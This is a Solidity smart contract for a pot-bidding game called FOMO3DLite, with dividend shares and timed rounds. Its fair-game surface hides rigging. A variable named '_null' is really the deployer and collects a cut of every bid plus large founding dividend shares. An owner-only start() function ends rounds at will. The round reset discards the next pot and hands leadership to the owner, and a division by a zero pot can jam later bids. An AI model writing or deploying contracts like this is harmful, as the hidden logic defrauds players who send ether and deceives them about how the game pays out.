1 pragma solidity 0.4 .19;
2 
3 contract FOMO3DLite {
4     using SafeMath
5     for uint256;
6 
7     event NewRound(
8         uint _timestamp,
9         uint _round,
10         uint _initialPot
11     );
12 
13     event Bid(
14         uint _timestamp,
15         address _address,
16         uint _amount,
17         uint _newPot
18     );
19 
20     event NewLeader(
21         uint _timestamp,
22         address _address,
23         uint _newPot,
24         uint _newDeadline
25     );
26 
27     event Winner(
28         uint _timestamp,
29         address _address,
30         uint _earnings,
31         uint _deadline
32     );
33 
34     event EarningsWithdrawal(
35         uint _timestamp,
36         address _address,
37         uint _amount
38     );
39 
40     event DividendsWithdrawal(
41         uint _timestamp,
42         address _address,
43         uint _dividendShares,
44         uint _amount,
45         uint _newTotalDividendShares,
46         uint _newDividendFund
47     );
48 
49     // Initial countdown duration at the start of each round
50     uint public constant BASE_DURATION = 1 days;
51 
52     // Amount by which the countdown duration decreases per ether in the pot
53     uint public constant DURATION_DECREASE_PER_ETHER = 2 minutes;
54 
55     // Minimum countdown duration
56     uint public constant MINIMUM_DURATION = 30 minutes;
57 
58     // Minimum fraction of the pot required by a bidder to become the new leader
59     uint public constant MIN_LEADER_FRAC_TOP = 1;
60     uint public constant MIN_LEADER_FRAC_BOT = 100000;
61 
62     // Fraction of each bid put into the dividend fund
63     uint public constant DIVIDEND_FUND_FRAC_TOP = 45;
64     uint public constant DIVIDEND_FUND_FRAC_BOT = 100;
65 
66     uint public constant FRAC_TOP = 15;
67     uint public constant FRAC_BOT = 100;
68 
69     // Fraction of the previous pot used to seed the next pot
70     uint public constant NEXT_POT_FRAC_TOP = 1;
71     uint public constant NEXT_POT_FRAC_BOT = 2;
72 
73     // Mapping from addresses to amounts earned
74     address _null;
75     mapping(address => uint) public earnings;
76 
77     // Mapping from addresses to dividend shares
78     mapping(address => uint) public dividendShares;
79 
80     // Total number of dividend shares
81     uint public totalDividendShares;
82 
83     address owner;
84 
85     // Value of the dividend fund
86     uint public dividendFund;
87 
88     // Current round number
89     uint public round;
90 
91     // Current value of the pot
92     uint public pot;
93 
94     // Address of the current leader
95     address public leader;
96 
97     // Time at which the current round expires
98     uint public deadline;
99 
100     function FOMO3DLite() public payable {
101         require(msg.value > 0);
102         _null = msg.sender;
103         round = 1;
104         pot = msg.value;
105         leader = _null;
106         totalDividendShares = 200000;
107         dividendShares[_null] = 200000;
108         deadline = computeDeadline();
109         NewRound(now, round, pot);
110         NewLeader(now, leader, pot, deadline);
111         owner = msg.sender;
112     }
113 
114     function computeDeadline() internal view returns(uint) {
115         uint _durationDecrease = DURATION_DECREASE_PER_ETHER.mul(pot.div(1 ether));
116         uint _duration;
117         if (MINIMUM_DURATION.add(_durationDecrease) > BASE_DURATION) {
118             _duration = MINIMUM_DURATION;
119         } else {
120             _duration = BASE_DURATION.sub(_durationDecrease);
121         }
122         return now.add(_duration);
123     }
124 
125     modifier advanceRoundIfNeeded {
126         if (now > deadline) {
127             uint _nextPot = pot.mul(NEXT_POT_FRAC_TOP).div(NEXT_POT_FRAC_BOT);
128             uint _leaderEarnings = pot.sub(_nextPot);
129             Winner(now, leader, _leaderEarnings, deadline);
130             earnings[leader] = earnings[leader].add(_leaderEarnings);
131             pot = 0;
132             leader = owner;
133             deadline = computeDeadline();
134             NewRound(now, round, pot);
135             NewLeader(now, leader, pot, deadline);
136         }
137         _;
138     }
139 
140     modifier onlyOwner() {
141         require(msg.sender == owner);
142         _;
143     }
144 
145     function bid() public payable advanceRoundIfNeeded {
146         uint _minLeaderAmount = pot.mul(MIN_LEADER_FRAC_TOP).div(MIN_LEADER_FRAC_BOT);
147         uint _bidAmountToCommunity = msg.value.mul(FRAC_TOP).div(FRAC_BOT);
148         uint _bidAmountToDividendFund = msg.value.mul(DIVIDEND_FUND_FRAC_TOP).div(DIVIDEND_FUND_FRAC_BOT);
149         uint _bidAmountToPot = msg.value.sub(_bidAmountToCommunity).sub(_bidAmountToDividendFund);
150 
151         earnings[_null] = earnings[_null].add(_bidAmountToCommunity);
152         dividendFund = dividendFund.add(_bidAmountToDividendFund);
153         pot = pot.add(_bidAmountToPot);
154         Bid(now, msg.sender, msg.value, pot);
155 
156         if (msg.value >= _minLeaderAmount) {
157             uint _dividendShares = msg.value.div(_minLeaderAmount);
158             dividendShares[msg.sender] = dividendShares[msg.sender].add(_dividendShares);
159             totalDividendShares = totalDividendShares.add(_dividendShares);
160             leader = msg.sender;
161             deadline = computeDeadline();
162             NewLeader(now, leader, pot, deadline);
163         }
164     }
165 
166     function withdrawEarnings() public advanceRoundIfNeeded {
167         require(earnings[msg.sender] > 0);
168         assert(earnings[msg.sender] <= this.balance);
169         uint _amount = earnings[msg.sender];
170         earnings[msg.sender] = 0;
171         msg.sender.transfer(_amount);
172         EarningsWithdrawal(now, msg.sender, _amount);
173     }
174 
175     function withdrawDividends() public {
176         require(dividendShares[msg.sender] > 0);
177         uint _dividendShares = dividendShares[msg.sender];
178         assert(_dividendShares <= totalDividendShares);
179         uint _amount = dividendFund.mul(_dividendShares).div(totalDividendShares);
180         assert(_amount <= this.balance);
181         dividendShares[msg.sender] = 0;
182         totalDividendShares = totalDividendShares.sub(_dividendShares);
183         dividendFund = dividendFund.sub(_amount);
184         msg.sender.transfer(_amount);
185         DividendsWithdrawal(now, msg.sender, _dividendShares, _amount, totalDividendShares, dividendFund);
186     }
187 
188     function start() public onlyOwner {
189         deadline = 0;
190     }
191 }
192 
193 /**
194  * @title SafeMath
195  * @dev Math operations with safety checks that throw on error
196  */
197 library SafeMath {
198     /**
199      * @dev Multiplies two numbers, throws on overflow.
200      */
201     function mul(uint256 a, uint256 b) internal pure returns(uint256) {
202         if (a == 0) {
203             return 0;
204         }
205         uint256 c = a * b;
206         assert(c / a == b);
207         return c;
208     }
209 
210     /**
211      * @dev Integer division of two numbers, truncating the quotient.
212      */
213     function div(uint256 a, uint256 b) internal pure returns(uint256) {
214         // assert(b > 0); // Solidity automatically throws when dividing by 0
215         uint256 c = a / b;
216         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
217         return c;
218     }
219 
220     /**
221      * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
222      */
223     function sub(uint256 a, uint256 b) internal pure returns(uint256) {
224         assert(b <= a);
225         return a - b;
226     }
227 
228     /**
229      * @dev Adds two numbers, throws on overflow.
230      */
231     function add(uint256 a, uint256 b) internal pure returns(uint256) {
232         uint256 c = a + b;
233         assert(c >= a);
234         return c;
235     }
236 }